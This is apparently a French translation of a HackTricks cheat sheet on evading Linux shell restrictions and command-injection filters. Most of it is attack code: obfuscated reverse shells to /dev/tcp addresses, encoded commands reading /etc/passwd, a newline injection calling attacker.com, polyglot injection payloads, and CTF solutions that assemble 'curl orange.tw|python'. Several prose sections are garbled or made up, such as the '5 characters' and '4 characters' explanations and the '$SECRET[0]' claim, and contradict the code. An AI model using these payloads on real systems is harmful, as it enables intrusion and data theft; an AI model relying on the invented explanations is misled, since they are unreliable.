# Contourner les restrictions Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilisez [**Trickest**](https://trickest.io/) pour construire et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Contournement des limitations courantes

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversée courte

Une shell inversée est une technique utilisée en piratage informatique pour obtenir un accès à distance à un système cible. Elle permet à un attaquant de contrôler le système cible à partir de son propre système. Voici un exemple de shell inversée courte en utilisant Bash :

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Dans cet exemple, le shell inversée se connecte à l'adresse IP `10.0.0.1` sur le port `8080`. L'option `-i` est utilisée pour ouvrir une session interactive, tandis que `>& /dev/tcp/10.0.0.1/8080` redirige les entrées et sorties standard vers la connexion réseau. En utilisant cette commande, un attaquant peut exécuter des commandes sur le système cible à distance.

Il est important de noter que l'utilisation de shell inversée pour accéder à un système sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Cette technique est présentée uniquement à des fins éducatives et pour la sensibilisation à la sécurité.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Contourner les chemins et les mots interdits

Lorsque vous effectuez des tests de pénétration sur un système Linux, il peut arriver que vous rencontriez des restrictions de chemin ou des mots interdits qui limitent votre accès aux ressources du système. Heureusement, il existe des commandes Linux utiles qui peuvent vous aider à contourner ces restrictions et à accéder aux fichiers et répertoires souhaités.

#### Utilisation de la commande `cd`

La commande `cd` est utilisée pour changer de répertoire dans le système de fichiers. Pour contourner les restrictions de chemin, vous pouvez utiliser des caractères spéciaux tels que `..` pour remonter d'un niveau dans l'arborescence des répertoires. Par exemple, si vous êtes dans le répertoire `/home/user` et que vous souhaitez accéder au répertoire `/etc`, vous pouvez utiliser la commande suivante :

```bash
cd ../etc
```

Cela vous permettra de naviguer vers le répertoire `/etc` même si vous êtes dans un répertoire restreint.

#### Utilisation de la commande `ls`

La commande `ls` est utilisée pour lister les fichiers et répertoires dans un répertoire donné. Si vous rencontrez des mots interdits dans le nom d'un fichier ou d'un répertoire, vous pouvez utiliser des caractères d'échappement pour contourner cette restriction. Par exemple, si vous avez un fichier nommé `forbidden.txt` et que le mot "forbidden" est interdit, vous pouvez utiliser la commande suivante pour lister le fichier :

```bash
ls forbidden\.txt
```

En utilisant le caractère d'échappement `\`, vous pouvez contourner la restriction et afficher le fichier souhaité.

#### Utilisation de la commande `cat`

La commande `cat` est utilisée pour afficher le contenu d'un fichier. Si vous rencontrez des mots interdits dans le contenu d'un fichier, vous pouvez utiliser des caractères d'échappement pour contourner cette restriction. Par exemple, si vous avez un fichier nommé `sensitive.txt` et que le mot "sensitive" est interdit, vous pouvez utiliser la commande suivante pour afficher le contenu du fichier :

```bash
cat sensitive\.txt
```

En utilisant le caractère d'échappement `\`, vous pouvez contourner la restriction et afficher le contenu du fichier souhaité.

#### Conclusion

En utilisant les commandes `cd`, `ls` et `cat` de manière astucieuse, vous pouvez contourner les restrictions de chemin et les mots interdits lors de vos tests de pénétration sur un système Linux. Cependant, il est important de noter que ces techniques doivent être utilisées de manière éthique et légale, dans le cadre d'un test de sécurité autorisé.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Contourner les espaces interdits

Lorsque vous êtes confronté à des restrictions d'utilisation des espaces dans un environnement Linux, il existe plusieurs techniques pour les contourner. Voici quelques commandes utiles :

- Utilisez des guillemets simples ou doubles pour entourer les noms de fichiers ou de répertoires contenant des espaces. Par exemple, au lieu d'utiliser `cd Documents/My Files`, utilisez `cd 'Documents/My Files'` ou `cd "Documents/My Files"`.
- Utilisez des caractères d'échappement pour indiquer que l'espace doit être interprété littéralement. Par exemple, au lieu d'utiliser `cd Documents/My\ Files`, utilisez `cd Documents/My\\ Files`.
- Utilisez des caractères de substitution pour représenter l'espace. Par exemple, au lieu d'utiliser `cd Documents/My Files`, utilisez `cd Documents/My?Files` ou `cd Documents/My*Files`.

Ces techniques vous permettront de contourner les restrictions d'utilisation des espaces et d'accéder aux fichiers ou répertoires nécessaires dans votre environnement Linux.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Contourner les restrictions de backslash et de slash

Lorsque vous êtes confronté à des restrictions de backslash et de slash dans un environnement Linux, il existe plusieurs commandes utiles pour contourner ces restrictions et accéder aux fichiers et répertoires souhaités.

#### Utilisation de l'opérateur de substitution de shell

L'opérateur de substitution de shell, également connu sous le nom de backtick (`), permet d'exécuter une commande à l'intérieur d'une autre commande. Cela peut être utilisé pour contourner les restrictions de backslash et de slash.

```shell
ls `echo /etc/pa\sswd`
```

Dans cet exemple, la commande `echo /etc/pa\sswd` est exécutée en premier, puis le résultat est utilisé comme argument pour la commande `ls`. Cela permet d'accéder au fichier `/etc/passwd` malgré la restriction de backslash.

#### Utilisation de l'opérateur de substitution de commande

L'opérateur de substitution de commande, également connu sous le nom de dollar sign suivi de parenthèses ($()), permet d'exécuter une commande à l'intérieur d'une autre commande. Cela peut également être utilisé pour contourner les restrictions de backslash et de slash.

```shell
ls $(echo /etc/pa\sswd)
```

Dans cet exemple, la commande `echo /etc/pa\sswd` est exécutée en premier, puis le résultat est utilisé comme argument pour la commande `ls`. Cela permet d'accéder au fichier `/etc/passwd` malgré la restriction de backslash.

#### Utilisation de l'échappement avec des guillemets

L'échappement avec des guillemets peut également être utilisé pour contourner les restrictions de backslash et de slash. Vous pouvez utiliser des guillemets simples ('') ou des guillemets doubles ("") pour entourer le chemin d'accès.

```shell
ls '/etc/pa\sswd'
```

Dans cet exemple, le chemin d'accès est entouré de guillemets simples, ce qui permet d'accéder au fichier `/etc/passwd` malgré la restriction de backslash.

Ces techniques peuvent être utiles lorsque vous êtes confronté à des restrictions de backslash et de slash dans un environnement Linux et que vous avez besoin d'accéder à des fichiers ou répertoires spécifiques.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Contourner les pipes

Lorsque vous rencontrez des restrictions d'accès à certaines commandes ou fonctionnalités dans un environnement Linux, vous pouvez contourner ces restrictions en utilisant des pipes. Les pipes permettent de rediriger la sortie d'une commande vers une autre, ce qui peut être utile pour contourner les restrictions imposées.

Voici un exemple de commande utilisant des pipes pour contourner les restrictions :

```bash
commande1 | commande2
```

Dans cet exemple, la sortie de la `commande1` est redirigée vers la `commande2`. Cela permet d'exécuter la `commande2` avec les résultats de la `commande1`, contournant ainsi les restrictions éventuelles imposées à la `commande2`.

Il est important de noter que l'utilisation de pipes pour contourner les restrictions peut être considérée comme une violation de la politique de sécurité de certains systèmes. Il est donc essentiel de comprendre les implications et les risques associés avant d'utiliser cette technique.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Contourner avec l'encodage hexadécimal

L'encodage hexadécimal est une technique couramment utilisée pour contourner les restrictions de Bash. Il permet de représenter les caractères spéciaux en utilisant leur valeur hexadécimale.

Voici comment utiliser l'encodage hexadécimal pour contourner les restrictions de Bash :

1. Trouvez le caractère que vous souhaitez utiliser en hexadécimal. Par exemple, si vous voulez utiliser le caractère `;`, sa valeur hexadécimale est `3b`.

2. Utilisez la syntaxe `\x` suivie de la valeur hexadécimale pour représenter le caractère. Par exemple, pour représenter le caractère `;`, vous utiliserez `\x3b`.

3. Utilisez cette représentation dans votre commande pour contourner les restrictions de Bash. Par exemple, au lieu d'utiliser `commande ; autre_commande`, vous utiliserez `commande\x3b autre_commande`.

En utilisant l'encodage hexadécimal, vous pouvez contourner les restrictions de Bash et exécuter des commandes qui seraient normalement bloquées. Cependant, il est important de noter que cette technique peut être détectée par certains outils de sécurité, il est donc recommandé de l'utiliser avec prudence et uniquement dans un environnement contrôlé.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Contourner les restrictions IP

Il existe plusieurs méthodes pour contourner les restrictions IP et accéder à des ressources ou des services qui sont normalement bloqués. Voici quelques techniques couramment utilisées :

1. **Utilisation d'un proxy** : Un proxy agit comme un intermédiaire entre votre appareil et le serveur cible. En utilisant un proxy, vous pouvez masquer votre adresse IP réelle et utiliser une adresse IP différente pour accéder aux ressources restreintes.

2. **Utilisation d'un VPN** : Un réseau privé virtuel (VPN) crée un tunnel sécurisé entre votre appareil et un serveur distant. En utilisant un VPN, vous pouvez acheminer votre trafic Internet via un serveur distant, ce qui masque votre adresse IP réelle et vous permet d'accéder aux ressources restreintes.

3. **Utilisation du réseau Tor** : Le réseau Tor est un réseau décentralisé qui permet de naviguer sur Internet de manière anonyme. En utilisant le réseau Tor, votre trafic Internet est acheminé à travers plusieurs nœuds, masquant ainsi votre adresse IP réelle et vous permettant d'accéder aux ressources restreintes.

4. **Utilisation d'une adresse IP partagée** : Si vous êtes connecté à un réseau local ou à un réseau public, vous pouvez essayer de vous connecter à une adresse IP partagée avec d'autres utilisateurs. Cela peut vous permettre de contourner les restrictions IP en utilisant une adresse IP différente.

Il est important de noter que contourner les restrictions IP peut être illégal dans certaines juridictions ou contre les conditions d'utilisation des services en ligne. Assurez-vous de respecter les lois et les politiques applicables avant d'utiliser ces techniques.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltration de données basée sur le temps

Lorsque vous effectuez un test de pénétration, il peut être nécessaire d'exfiltrer des données sensibles du système cible. Cependant, il est possible que le système soit configuré pour restreindre l'accès à certains outils ou commandes, ce qui peut rendre cette tâche difficile. Dans de tels cas, vous pouvez utiliser des techniques d'exfiltration de données basées sur le temps pour contourner ces restrictions.

L'idée derrière l'exfiltration de données basée sur le temps est d'utiliser des commandes ou des outils disponibles sur le système cible pour transmettre les données de manière discrète. Voici quelques commandes Linux couramment utilisées pour cette technique :

- **ping** : La commande ping peut être utilisée pour envoyer des paquets ICMP à une adresse IP spécifiée. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les délais entre les paquets ping.

- **nslookup** : La commande nslookup peut être utilisée pour effectuer des requêtes DNS. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les réponses DNS.

- **curl** : La commande curl peut être utilisée pour effectuer des requêtes HTTP. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les délais entre les requêtes.

- **wget** : La commande wget peut être utilisée pour télécharger des fichiers à partir d'URL. Vous pouvez utiliser cette commande pour transmettre les données en encodant les bits dans les délais entre les téléchargements.

Lors de l'utilisation de ces commandes, vous devrez développer un script ou un programme qui encode les données à exfiltrer en utilisant les délais entre les commandes ou les réponses. Vous devrez également configurer un mécanisme pour recevoir les données exfiltrées.

Il est important de noter que l'exfiltration de données basée sur le temps peut être lente et nécessite une bonne compréhension des commandes et des protocoles utilisés. De plus, cette technique peut être détectée par des outils de surveillance réseau, il est donc essentiel de prendre des mesures pour éviter la détection.

En résumé, l'exfiltration de données basée sur le temps est une technique utile pour contourner les restrictions de bash et exfiltrer des données sensibles d'un système cible. Cependant, cela nécessite une planification minutieuse et une compréhension approfondie des commandes et des protocoles utilisés.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtenir des caractères à partir de variables d'environnement

Il est possible d'obtenir des caractères à partir de variables d'environnement en utilisant la syntaxe `$VARNAME[index]` dans le shell Bash. Cela permet d'accéder à un caractère spécifique à partir de la valeur d'une variable d'environnement.

Par exemple, si nous avons une variable d'environnement appelée `SECRET` avec la valeur `password123`, nous pouvons obtenir le caractère `p` en utilisant la syntaxe suivante :

```bash
echo $SECRET[0]
```

Cela affichera le caractère `p` à la sortie.

Il est important de noter que l'index commence à partir de zéro, donc pour obtenir le deuxième caractère, nous utiliserions `$SECRET[1]`, pour le troisième caractère `$SECRET[2]`, et ainsi de suite.

Cette technique peut être utile lors de l'exploitation de vulnérabilités de fuite d'informations sensibles à partir de variables d'environnement.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltration de données DNS

Vous pouvez utiliser **burpcollab** ou [**pingb**](http://pingb.in) par exemple.

### Commandes intégrées

Dans le cas où vous ne pouvez pas exécuter de fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes intégrées pour obtenir une RCE**, il existe quelques astuces pratiques pour le faire. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes intégrées**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la restriction. Idée de [**devploit**](https://twitter.com/devploit).\
Tout d'abord, vérifiez toutes les [**commandes intégrées du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations** :
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injection de commandes polyglottes

Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting commands that can be interpreted by multiple shells, allowing an attacker to execute arbitrary commands regardless of the shell being used.

This technique is particularly useful in scenarios where the target system has restricted access to certain commands or has implemented security measures to prevent command injection attacks. By using a polyglot payload, an attacker can bypass these restrictions and execute commands successfully.

To perform a polyglot command injection, an attacker needs to carefully craft the payload to ensure it is interpreted correctly by multiple shells. This typically involves using special characters and syntax that are valid in multiple shell languages.

It is important to note that polyglot command injection is a highly advanced technique and requires a deep understanding of shell languages and their syntax. It should only be used by experienced hackers in controlled environments for legitimate purposes, such as penetration testing or security research.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Contourner les regex potentielles

Certaines restrictions peuvent être mises en place en utilisant des expressions régulières (regex) pour filtrer les entrées. Cependant, il existe des techniques pour contourner ces restrictions et exécuter des commandes malveillantes.

Voici quelques exemples de commandes qui peuvent être utilisées pour contourner les regex potentielles :

- Utiliser des caractères d'échappement : en ajoutant un caractère d'échappement (\) devant un caractère spécial, il est possible de le rendre littéral et de contourner la regex. Par exemple, si la regex interdit l'utilisation du caractère « | », vous pouvez l'échapper en utilisant « \| ».

- Utiliser des variantes de caractères : en utilisant des variantes de caractères, il est possible de contourner les regex qui filtrent certains caractères. Par exemple, si la regex interdit l'utilisation de la lettre « e », vous pouvez utiliser des variantes telles que « é », « ê » ou « è ».

- Utiliser des espaces blancs : en utilisant des espaces blancs, il est possible de contourner les regex qui filtrent certains mots ou caractères. Par exemple, si la regex interdit l'utilisation du mot « cat », vous pouvez contourner cette restriction en utilisant des espaces blancs pour séparer les lettres, comme « c a t ».

Il est important de noter que ces techniques peuvent varier en fonction de la façon dont les regex sont mises en place et de la complexité des restrictions. Il est donc essentiel de comprendre les mécanismes de filtrage utilisés avant de tenter de les contourner.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Le Bashfuscator est un outil puissant utilisé pour contourner les restrictions de Bash. Il permet de rendre le code Bash illisible et difficile à comprendre, ce qui rend plus difficile la détection des vulnérabilités et des failles de sécurité.

Le Bashfuscator utilise différentes techniques pour obscurcir le code Bash, telles que la substitution de variables, l'ajout de caractères spéciaux et l'utilisation de fonctions personnalisées. Ces techniques rendent le code Bash plus complexe et moins évident pour les analystes et les outils de sécurité.

L'utilisation du Bashfuscator peut être utile lors de tests de pénétration ou de l'écriture de scripts malveillants, car il rend le code plus difficile à analyser et à détecter. Cependant, il est important de noter que l'utilisation du Bashfuscator pour des activités illégales est strictement interdite et peut entraîner des conséquences légales graves.

Pour utiliser le Bashfuscator, vous devez d'abord l'installer sur votre système. Une fois installé, vous pouvez l'utiliser en ligne de commande pour obscurcir votre code Bash. Voici un exemple de commande pour utiliser le Bashfuscator :

```
bashfuscator --input script.sh --output obfuscated.sh
```

Cette commande prend un fichier d'entrée `script.sh` contenant le code Bash que vous souhaitez obscurcir, et génère un fichier de sortie `obfuscated.sh` contenant le code Bash obscurci.

Il est important de noter que le Bashfuscator n'est pas une solution de sécurité complète et ne doit pas être utilisé comme tel. Il est préférable de mettre en place des mesures de sécurité appropriées pour protéger votre système et vos applications contre les attaques potentielles.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE avec 5 caractères

Lors de l'exploitation d'une vulnérabilité de commande à distance (RCE), il est souvent nécessaire de contourner les restrictions imposées par le shell Bash. Voici une méthode simple pour contourner ces restrictions en utilisant seulement 5 caractères.

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.19(1)-release
$ echo $0-$BASH_VERSION
bash-4.4.19(1)-release
```

La variable d'environnement `$0` contient le nom du shell en cours d'exécution, tandis que la variable `$BASH_VERSION` contient la version de Bash. En combinant ces deux variables avec un tiret `-`, nous pouvons exécuter une commande arbitraire.

```bash
$ $0-$BASH_VERSION -c 'id'
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

Dans cet exemple, nous utilisons la commande `id` pour afficher les informations sur l'utilisateur actuel. Cependant, vous pouvez exécuter n'importe quelle commande à la place de `id`.

Cette méthode est utile lorsque vous êtes confronté à des restrictions de shell qui vous empêchent d'exécuter des commandes arbitraires. En utilisant cette technique, vous pouvez contourner ces restrictions et exécuter des commandes pour exploiter la vulnérabilité RCE.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE avec 4 caractères

Lors de l'exploitation d'une vulnérabilité de commande à distance (RCE), il est souvent nécessaire de contourner les restrictions imposées par le shell Bash. Dans certains cas, vous pouvez utiliser une technique qui ne nécessite que 4 caractères pour exécuter du code arbitraire.

La technique consiste à utiliser la commande `echo` pour exécuter du code Bash. Voici comment procéder :

1. Utilisez la commande `echo` pour afficher le code que vous souhaitez exécuter. Par exemple, si vous voulez exécuter la commande `ls`, vous pouvez utiliser la commande suivante :

   ```bash
   echo ls
   ```

2. Utilisez le caractère de redirection `>` pour rediriger la sortie de la commande `echo` vers le fichier `/tmp/cmd`. Par exemple :

   ```bash
   echo ls > /tmp/cmd
   ```

3. Utilisez la commande `source` pour exécuter le contenu du fichier `/tmp/cmd`. Par exemple :

   ```bash
   source /tmp/cmd
   ```

En utilisant cette technique, vous pouvez exécuter n'importe quelle commande Bash en utilisant seulement 4 caractères. Cependant, il est important de noter que cette technique peut être détectée par certains systèmes de détection d'intrusion, il est donc recommandé de l'utiliser avec prudence et uniquement dans un environnement contrôlé.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Contournement de restrictions de lecture seule/noexec/distroless

Si vous vous trouvez dans un système de fichiers avec des protections en lecture seule et noexec, ou même dans un conteneur distroless, il existe encore des moyens d'exécuter des binaires arbitraires, voire un shell !:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Contournement de Chroot et autres prisons

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Références et plus

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utilisez [**Trickest**](https://trickest.io/) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? Ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
